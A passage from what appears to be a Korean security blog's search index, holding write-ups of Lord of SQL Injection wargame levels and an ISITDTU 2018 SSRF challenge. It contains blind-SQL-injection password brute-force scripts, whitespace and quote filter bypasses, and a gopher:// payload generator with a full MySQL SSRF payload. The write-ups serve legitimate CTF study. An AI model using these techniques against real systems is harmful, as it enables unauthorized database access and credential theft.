id='admin'-------------------------------------------------------------------------------------------------------------------ZOMBIE_ASSASSIN Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/\\\\\\|prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\");   if(preg_match('/\\\\\\|prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(@ereg(\"'\",$_GET[id])) exit(\"HeHe\");   if(@ereg(\"'\",$_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) solve(\"zombie_assassin\");   highlight_file(__FILE__); ?&gt;ZOMBIE_ASSASSIN Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/04/los-zombie_assassin.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-03-los-assassin-html": {
        "title": "[Lord of SQL Injection] LoS - assassin 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 3, 2018",
        "author": "",
        "category": "",
        "content": "이번에는 문제 이름이 몬스터 이름이 아니다.assassin 문제인데, 개인적으로 재밌던 문제이다.코드는 다음과 같다.----------------------------------------------------------------------query : select id from prob_assassin where pw like ''----------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/\\'/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_assassin where pw like '{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"assassin\");   highlight_file(__FILE__); ?&gt;필터링이 '(싱글쿼터) 딱 한개만 있다.그리고 = 대신에 like이 쓰였다.처음에는 '를 우회하는 방법이 있을 거라고 생각 해 이 부분에 초점을 맞추어 문제를 풀어보려 했다.그런데 아무리 해도 우회를 하는 방법을 찾을수가 없었다.그러다 눈에 띈 부분이 왜 =가 아니라 like을 사용 했을까 였다.나는 단순히 =와 like가 동일하다고 생각했는데, 뭔가 다른 점이 있을 것 같았다.그래서 구글에 mysql like이라고 검색을 해봤는데, %를 알게 되었다.like을 사용한다면, %를 이용 해 특정 문자가 있는 행을 추출할 수 있다.예를 들어 아래와 같은 쿼리문이 있다고 가정해보자.select * from user where id like '%a%';이 경우, %는 모든 문자를 의미하게 된다.때문에 %a%라고 한다면, a의 앞뒤로 어떠한 문자가 있는 경우를 말한다.즉, man, woman 등은 a의 앞뒤로 문자가 있어 조건에 부합하게 된다.반면 apple는 a의 앞에 문자가 없기 때문에 조건에 맞지 않는다.그래서 이 방법을 가지고 assassin 문제를 풀기로 했다.가장 먼저 테스트 한 것은 그냥 %만 입력 해 보는 것이었다.pw에 분명 문자가 있을테니, pw에 뭐라도 문자가 있는 행을 추출 해 보려 했다.그런데 Hello guest가 출력되었다.아마도 테이블에 guest가 admin보다 위에 있어 먼저 추출 된 것 같다.그래서 이번에는 %a% 형태로 만들어서 하나하나 테스트 해 보기로 했다.손으로 하려다가 귀찮아져서 아래와 같이 코드를 구현했다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=%\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find password\"for i in range(48, 128):\ttry:\t\tquery = url + chr(i) + \"%\"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif 'Hello admin' in r.text:\t\tflag += chr(i)\t\tprint \"[+] Found :\", flagprint \"[+] Found password : \", flagprint \"[+] End\"그런데 결과가 안나왔다.(눙물…)그래서 이번에는 Hello guest가 출력되는 문자를 찾도록 조건문을 수정 해 다시 테스트 해 보았다.그 결과 아래와 같은 문자들을 얻을 수 있었다.$ python ex.py [+] Start[+] Find password[+] Found : 0[+] Found : 01[+] Found : 012[+] Found : 0129[+] Found : 0129D[+] Found : 0129DE[+] Found : 0129DEF[+] Found : 0129DEF_[+] Found : 0129DEF_d[+] Found : 0129DEF_de[+] Found : 0129DEF_def[+] Found password :  0129DEF_def[+] End아마도 테이블에서 guest와 admin의 pw가 같은 문자들로만 이루어져 있고, guest가 admin보다 위에 있어 guest만 출력되는 것 같다.그래서 저 문자를 적절하게 조합하면 admin을 얻을 수 있지 않을까 생각 해, 이것저것 시도 해 보다 보니 아래와 같이 입력했을 때 문제를 풀 수 있었다.?pw=%e%d%-------------------------------------------------------------------------------query : select id from prob_assassin where pw like '%e%d%'-------------------------------------------------------------------------------Hello adminASSASSIN Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/\\'/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_assassin where pw like '{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"assassin\");   highlight_file(__FILE__); ?&gt;ASSASSIN Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/03/los-assassin.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-02-los-giant-html": {
        "title": "[Lord of SQL Injection] LoS - giant 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 2, 2018",
        "author": "",
        "category": "",
        "content": "다음 문제는 giant 이다.갑자기 소스코드가 너무 간단해져서 당황했다.코드는 다음과 같다.----------------------------------------------------------query : select 1234 fromprob_giant where 1----------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(strlen($_GET[shit])&gt;1) exit(\"No Hack ~_~\");   if(preg_match('/ |\\n|\\r|\\t/i', $_GET[shit])) exit(\"HeHe\");   $query = \"select 1234 from{$_GET[shit]}prob_giant where 1\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result[1234]) solve(\"giant\");   highlight_file(__FILE__); ?&gt;앞의 문제들에 있었던 필터링들이 싹 사라졌다.또 pw나 no를 입력하는게 아니라 이번엔 shit라는 값을 넘겨주어야 하는데, 이 값이 from과 prob_giant 즉, table 명 사이에 있다.때문에 아무런 값이 없을 경우, fromprob_giant가 되어 제대로 쿼리가 실행되지 않는다.문제를 풀기 위해서는 $result[1234]가 있으면 된다.문제의 쿼리에서 select 1234라고 되어 있으니, 해당 쿼리만 제대로 실행되도록 만들어 주면 될 것 같다.그러기 위해서는 공백이 필요하다.그런데 필터링에 공백, \\n, \\r, \\t가 있어서, 어지간한 공백 문자로는 공백을 만들어낼 수 없다.아스키코드표를 자세히 보면 0x0b 값을 보면 VT 혹은 Vertical Tab이라는 문자가 있다.반면 우리가 흔히 알고있는 0x09는 HT 혹은 Horizontal Tab이다.0x09가 가로로 탭을 하는 것이라면, 0x0b는 세로로 탭을 하는 것이라고 생각하면 될 것 같다.그런데 이 VT로 whitespace에 대한 필터링을 우회할 수 있다.VT를 값으로 넘겨주기 위해 URL에 ?shit=%0b를 입력 해 보았다.------------------------------------------------------------query : select 1234 from\u000bprob_giant where 1------------------------------------------------------------GIANT Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(strlen($_GET[shit])&gt;1) exit(\"No Hack ~_~\");   if(preg_match('/ |\\n|\\r|\\t/i', $_GET[shit])) exit(\"HeHe\");   $query = \"select 1234 from{$_GET[shit]}prob_giant where 1\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result[1234]) solve(\"giant\");   highlight_file(__FILE__); ?&gt;성공적으로 문제를 풀 수 있었다.GIANT Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/02/los-giant.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-01-los-bugbear-html": {
        "title": "[Lord of SQL Injection] LoS - bugbear 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 1, 2018",
        "author": "",
        "category": "",
        "content": "이번 문제는 생각 전환의 필요성에서 살짝 느꼈던 문제였다.뭔가 허점을 찌르는 느낌이었다.bugbear라는 문제이다.코드는 다음과 같다.------------------------------------------------------------------------------------------------query : select id from prob_bugbear where id='guest' and pw='' and no=------------------------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[no])) exit(\"No Hack ~_~\");   if(preg_match('/\\'/i', $_GET[pw])) exit(\"HeHe\");   if(preg_match('/\\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit(\"HeHe\");   $query = \"select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"bugbear\");   highlight_file(__FILE__); ?&gt;필터링을 보면 뭔가 굉장히 빡세게 걸려있다.이 전 문제들에서 사용했던 것들이 대부분 막혀있다.하지만 다행인건, &amp;&amp;와 ||은 사용할 수 있다는 것이다.그래도 아직 like과 =를 사용할 수 없기 때문에 비교를 할 수 없다.아니 정정하자면, 같은지 비교를 할 수 없다.그럼 반면, 내가 입력한 값보다 큰지 혹은 작은지는 비교할 수 있다.이 때문에 나는 부등호를 사용해서 문제를 풀었다.내가 많이 고민했던 부분은 id='admin'을 사용할 수 없다는 점이었다.admin의 pw를 출력하긴 해야 하는데, id='admin'을 그 어떤 방법으로도 비교할 수 없어 보였다.그래서 부등호를 사용해 비교할 수 있는 값에 초점을 맞추어 다시 문제를 보았다.그러다 눈에 띈 것이 no였다.아마도 다른 문제들처럼, 각각의 계정에 no 값이 부여되어 있을 것이다.때문에 부등호를 이용 해 no를 비교한다면, id가 admin인 행을 구할 수 있지 않을까 생각했다.이를 확인하기 위해 아래와 같이 입력 해 보았다.?pw=1&amp;no=1||no&lt;2그랬더니 Hello guest가 출력되었다.이것저것 시도 해 보니, ?pw=1&amp;no=1||no&gt;1을 입력하니 Hello admin을 얻을 수 있었다.일단 id가 admin인 행을 구할 수 있으니, pw의 길이와 값은 이 전 문제와 동일하게 length()와 min()를 사용하고, 부등호를 통해 비교하게 하면 될 것이다.또한 만약 Hello admin이 출력 된다면 그 값이 아니라 해당 값 - 1을 길이 혹은 pw의 일부라고 생각하면 된다.이를 토대로 아래와 같이 코드를 구현했다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&amp;no=0||no\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 20):\ttry:\t\tquery = url + \"&gt;1%26%26length(pw)&lt;\" + str(i)\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif 'Hello admin' in r.text:\t\tlength = i - 1\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"&gt;1%26%26mid(pw,\" + str(j) + \",1)&lt;char(\" + str(i) + \")\"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'Hello admin' in r.text:\t\t\tflag += chr(i - 1)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"너무 한번에 결과가 나와서 당황했는데, 다행히 제대로 된 pw를 얻을 수 있었다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  8[+] Find password[+] Found 1 : 5[+] Found 2 : 52[+] Found 3 : 52D[+] Found 4 : 52DC[+] Found 5 : 52DC3[+] Found 6 : 52DC39[+] Found 7 : 52DC399[+] Found 8 : 52DC3991[+] Found password :  52DC3991[+] End이전 문제들처럼 알파벳 소문자로 바꿔서 아래와 같이 입력하면 문제가 풀린다.?pw=52dc3991------------------------------------------------------------------------------------------------------------query : select id from prob_bugbear where id='guest' and pw='52dc3991' and no=------------------------------------------------------------------------------------------------------------BUGBEAR Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[no])) exit(\"No Hack ~_~\");   if(preg_match('/\\'/i', $_GET[pw])) exit(\"HeHe\");   if(preg_match('/\\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit(\"HeHe\");   $query = \"select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"bugbear\");   highlight_file(__FILE__); ?&gt;BUGBEAR Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/01/los-bugbear.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-31-los-darkknight-html": {
        "title": "[Lord of SQL Injection] LoS - darkknight 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 31, 2018",
        "author": "",
        "category": "",
        "content": "아 뭔가 쓸데없이 오타도 많이내고, 뭔가 자잘한 삽질을 많이 한 문제이다.잠을 제대로 못자서 그런건지 바보같은 삽질을 했다.darkknight 라는 문제인데, 얘도 Blind SQL Injection 문제이다.코드는 다음과 같다.---------------------------------------------------------------------------------------------------query : select id from prob_darkknight where id='guest' and pw='' and no=---------------------------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[no])) exit(\"No Hack ~_~\");   if(preg_match('/\\'/i', $_GET[pw])) exit(\"HeHe\");   if(preg_match('/\\'|substr|ascii|=/i', $_GET[no])) exit(\"HeHe\");   $query = \"select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"darkknight\");   highlight_file(__FILE__); ?&gt;이번엔 ascii도 사용을 못하고 '도 사용할 수 없다.그럼 쿼리문에서 사용하는 id = 'admin'이라는 문자를 사용할 수 없다.이 문제에 대해서는 금방 답을 찾았다.바로 hex 값을 이용하는 것이다.id = 'admin' 대신 id = 0x61646d696e를 입력해도 같은 결과를 얻을 수 있다.그럼 admin의 pw의 길이를 구하는 쿼리는 아래와 같이 완성된다.?pw=1&amp;no=0 or id like 0x61646d696e and length(pw) like 1문제는 pw를 한 글자 씩 알아낼 때 이다.'를 사용할 수 없으므로, mid 함수를 통해 pw를 한 글자 씩 뽑는다 하더라도 비교를 할 수가 없다.처음에는 MySQL에 있는 hex 함수를 사용할까 했다.여기서 삽질한게, hex는 10진수를 16진수 값으로 혹은 16진수를 10진수 값으로 바꾸어주는 함수인데, 나는 이걸 알고있었는데도 16진수 값을 입력하면 비교가 되겠지! 하고 생각했다.추출되는 값은 char 형태의 문자기 때문에 당연히 비교할 수 없다.그 다음에는 char 함수를 사용하는 것을 생각했다.여기서 두번째 삽질을 했는데, char 함수의 인자는 10진수 숫자가 들어가야 한다.근데 코드를 이 전에 풀었던 코드를 가져와 살짝만 수정해서 사용하다보니, 파이썬 코드에서 chr(i)를 쿼리의 char 함수의 인자로 넣어주고 있었다.문제가 안풀리길래 도대체 왜지... 이러다가 쿼리를 출력 해 보고서야 깨달았다.쨌든 pw를 구하는 쿼리는 다음과 같은 형태가 된다.?pw=1&amp;no=0 or id like 0x61646d696e and mid(pw, 1, 1) like char(48)우여곡절 끝에 완성된 코드는 다음과 같다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"http://los.rubiya.kr/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 20):\ttry:\t\tquery = url + \"1&amp;no=0 or id like 0x61646d696e and length(pw) like \" + str(i)\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif 'Hello admin' in r.text:\t\tlength = i\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"1&amp;no=0 or id like 0x61646d696e and mid(pw, \" + str(j) + \", 1) like char(\" + str(i) + \")\"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'Hello admin' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"드디어 제대로 된 결과를 얻을 수 있었다.쓸데없는 삽질 후에 얻은 값진 admin의 pw이다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  8[+] Find password[+] Found 1 : 0[+] Found 2 : 0B[+] Found 3 : 0B7[+] Found 4 : 0B70[+] Found 5 : 0B70E[+] Found 6 : 0B70EA[+] Found 7 : 0B70EA1[+] Found 8 : 0B70EA1F[+] Found password :  0B70EA1F[+] End알파벳 소문자로 바꿔서 아래와 같이 입력하면 문제가 풀린다.?pw=0b70ea1f--------------------------------------------------------------------------------------------------------------query : select id from prob_darkknight where id='guest' and pw='0b70ea1f' and no=--------------------------------------------------------------------------------------------------------------DARKKNIGHT Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[no])) exit(\"No Hack ~_~\");   if(preg_match('/\\'/i', $_GET[pw])) exit(\"HeHe\");   if(preg_match('/\\'|substr|ascii|=/i', $_GET[no])) exit(\"HeHe\");   $query = \"select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"darkknight\");   highlight_file(__FILE__); ?&gt;DARKKNIGHT Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/31/los-darkknight.html"
      }
      ,
    
      "ctf-2018-2018-07-31-ctf-isitdtu2018-friss-html": {
        "title": "[ISITDTU 2018] Friss Write up",
        "tags": "Write-up, CTF, ISITDTU2018",
        "date": "July 31, 2018",
        "author": "",
        "category": "",
        "content": "갑자기 CTF가 많으니까 풀어볼 문제가 많아졌다.근데 다른사람이 작성한 Write-up 보고 문제를 보고 풀면 문제가 진짜 풀리고 배우는 점도 많아서 신난다.근데 또 새로운 문제 나오면 못풀겠지… 공부의 끝은 어디인가…암튼 이번엔 ISITDTU 2018에 나왔던 Friss라는 문제를 풀어보았다.문제 정보는 다음과 같다.http://35.190.142.60/아무것도 없이 주소만 준다.접속 해 보니까 또 아무것도 없이 입력창만 있다.소스코드를 보니까 저~~~아래에 작게 &lt;!-- index.php?debug=1--&gt;라고 써있다.친절하게 소스코드를 제공해 줬다.&lt;!DOCTYPE html&gt; &lt;html lang=\"en-US\"&gt; &lt;head&gt;&lt;title&gt;REQUESTS PAGE&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php include_once \"config.php\"; if (isset($_POST['url'])&amp;&amp;!empty($_POST['url'])) {     $url = $_POST['url'];     $content_url = getUrlContent($url); } else {     $content_url = \"\"; } if(isset($_GET['debug'])) {     show_source(__FILE__); } ?&gt; &lt;form action=\"index.php\" method=\"POST\"&gt; &lt;input name=\"url\" type=\"text\"&gt; &lt;input type=\"submit\" value=\"CURL\"&gt; &lt;/form&gt; &lt;?php  echo $content_url; ?&gt; &lt;/body&gt; ...&lt;!-- index.php?debug=1--&gt; 입력창에 url을 적으면 getUrlContent로 내용을 가져온다.그래서 입력창에 http://www.naver.com을 적어 보았다.localhost만 된다고 한다.그런데 분명히 Only access to localhost라는 문자열은 아까 확인 한 index.php에는 없었던 문자열이다.그래서 다시 소스코드를 살펴보니 include_once \"config.php\";라는 부분이 있다.그럼 config.php라는 파일이 있다는 소리니, 이 파일을 살펴봐야 할 것 같다.이 때 file 프로토콜을 사용하면 된다.index.php에서는 딱히 프로토콜에 대한 제한은 없었으니, file://127.0.0.1/var/www/html/config.php를 하면 아마도 config.php의 내용을 볼 수 있을 것이다.&lt;!DOCTYPE html&gt;&lt;html lang=\"en-US\"&gt;&lt;head&gt;&lt;title&gt;REQUESTS PAGE&lt;/title&gt;&lt;/head&gt;&lt;body&gt;curl 'file://127.0.0.1/var/www/html/config.php'&lt;form action=\"index.php\" method=\"POST\"&gt;&lt;input name=\"url\" type=\"text\"&gt;&lt;input type=\"submit\" value=\"CURL\"&gt;&lt;/form&gt;&lt;?php$hosts = \"localhost\";$dbusername = \"ssrf_user\";$dbpasswd = \"\";$dbname = \"ssrf\";$dbport = 3306;$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);function initdb($conn){\t$dbinit = \"create table if not exists flag(secret varchar(100));\";\tif(mysqli_query($conn,$dbinit)) return 1;\telse return 0;}function safe($url){\t$tmpurl = parse_url($url, PHP_URL_HOST);\tif($tmpurl != \"localhost\" and $tmpurl != \"127.0.0.1\")\t{\t\tvar_dump($tmpurl);\t\tdie(\"&lt;h1&gt;Only access to localhost&lt;/h1&gt;\");\t}\treturn $url;}function getUrlContent($url){\t$url = safe($url);\t$url = escapeshellarg($url);\t$pl = \"curl \".$url;\techo $pl;\t$content = shell_exec($pl);\treturn $content;}initdb($conn);?&gt;&lt;/body&gt;...&lt;!-- index.php?debug=1--&gt;데이터베이스 설정 부분과 테이블을 초기화 하는 소스코드가 있고, getUrlContent 함수가 구현되어 있다.getUrlContent 에서는 curl 입력한 URL 형태로 명령어를 만들어 shell_exec를 통해 실행 시켜 준다.눈여겨 봐야 할 부분은 데이터베이스 설정 부분과 테이블 초기화 소스코드이다.$hosts = \"localhost\";$dbusername = \"ssrf_user\";$dbpasswd = \"\";$dbname = \"ssrf\";$dbport = 3306;$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);function initdb($conn){\t$dbinit = \"create table if not exists flag(secret varchar(100));\";\tif(mysqli_query($conn,$dbinit)) return 1;\telse return 0;}살펴보면, 데이터베이스에 접속하기 위한 사용자의 아이디는 ssrf_user이며, 패스워드는 없다.또한 데이터베이스의 이름은 ssrf이고, initdb 함수에서 flag라는 데이터베이스가 없다면 새로 생성하라고 했기 때문에 ssrf 데이터베이스에는 flag라는 테이블이 있다는 것을 알 수 있다.이름도 flag이니, 아마 여기에 flag가 있을 것 같다.select * from ssrf.flag;를 쿼리를 실행시킬수만 있다면 문제를 짠! 하고 풀 수 있을 것이다.여기까진 알아낼만 했는데, 문제는 이제부터이다.도대체 저 정보만 가지고 어떻게 쿼리를 실행시킬 수 있는 것인가.Write-up을 보니 다들 gopher라는 프로토콜을 사용했다.  gopher 프로토콜      인터넷을 위해 고안된 문서 검색 프로토콜  gopher 프로토콜이 만들어진 취지는 위와 같다.http 프로토콜에서는 헤더나 기타 URL 인코딩 데이터를 제어할 수 없지만, gopher를 사용하면, 전송 된 모든 바이트를 제어할 수 있기 때문에 이 gopher 프로토콜을 이용하면 MySQL에 요청을 보낼 수 있다고 한다.요청을 보내는 방법은 생각보다 간단하다.  Wireshark를 통해 MySQL에 로그인 하는 패킷 캡쳐  해당 패킷을 바탕으로 gopher 프로토콜 요청 페이로드 작성페이로드 작성은 친절하게도 이미 누군가가 파이썬 코드를 작성 해 올려두었다.https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.pydump = raw_input(\"Give connection packet of mysql: \")query = raw_input(\"Give query to execute: \")auth = dump.replace(\"\\n\",\"\")def encode(s):    a = [s[i:i + 2] for i in range(0, len(s), 2)]    return \"gopher://127.0.0.1:3306/_%\" + \"%\".join(a)def get_payload(query):    if(query.strip()!=''):    \tquery = query.encode(\"hex\")    \tquery_length = '{:x}'.format((int((len(query) / 2) + 1)))    \tpay1 = query_length.rjust(2,'0') + \"00000003\" + query    \tfinal = encode(auth + pay1 + \"0100000001\")    \treturn final    else:\treturn encode(auth)print \"\\nYour gopher link is ready to do SSRF : \\n\"print get_payload(query)그럼 이제 내가 할 것은 MySQL 로그인 패킷을 잡는 것이다.이 패킷을 잡으려면 lo라는 자신에게 송수신하는 루프백 네트워크 디바이스의 패킷을 잡아야 한다.tcpdump로도 잡을 수 있지만, 나는 Wireshark를 사용하기로 했다.Ubuntu Desktop 버전에서 apt-get install wireshark 하면 다운받을 수 있다. 데스크탑 버전 안쓰는데 이거 때문에 새로 설치함Wireshark를 실행시킨 후 Loopback: lo를 선택한다.이 후 새로운 터미널을 열어서 아래와 같이 입력한다.mysql -h 127.0.0.1 -u ssrf_user앞서 config.php 파일에서 본 MySQL 사용자의 이름이 ssrf_user이기 때문에 -u ssrf_user를 입력 해 주었다.그런데 우리는 요청하는 패킷만 필요할 뿐, 응답은 필요없기 때문에 로그인에 성공하지 않아도 된다.Wireshark에 패킷이 잡혀있을텐데, 그 중 MySQL 프로토콜에서 Login Request라고 써진 패킷을 잡아보면 아래와 같을 것이다.해당 패킷에서 마우스 오른쪽 버튼 &gt; Follow &gt; TCP Stream을 선택하면 아래와 같다.이 데이터를 하단에 Show and save data as를 ASCII 에서 RAW로 변경 해 주면 아래와 같이 raw data를 얻을 수 있다.위의 블록으로 지정한 부분이 MySQL에서 Login을 요청하는 Raw data가 된다.이제 해당 내용을 복사 해 앞서 구한 파이썬 스크립트에 넣으면 gopher 프로토콜을 사용 한 Request 내용을 알려 줄 것이다.$ python ex.py Give connection packet of mysql: a800000185a6ff0100000001210000000000000000000000000000000000000000000000737372665f7573657200006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f7069640537313730320f5f636c69656e745f76657273696f6e06352e372e3233095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716cGive query to execute: select * from ssrf.flag;Your gopher link is ready to do SSRF : gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%73%73%72%66%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%37%31%37%30%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%33%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%73%73%72%66%2e%66%6c%61%67%3b%01%00%00%00%01마지막에 나온 내용을 복사 해 문제의 입력 창에 넣으면 아래와 같이 flag를 얻을 수 있다.FLAG : ISITDTU{JUST_4_SSrF_B4B3!!}",
        "url": "//ctf/2018/2018/07/31/ctf-isitdtu2018-friss.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-30-los-golem-html": {
        "title": "[Lord of SQL Injection] LoS - golem 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 30, 2018",
        "author": "",
        "category": "",
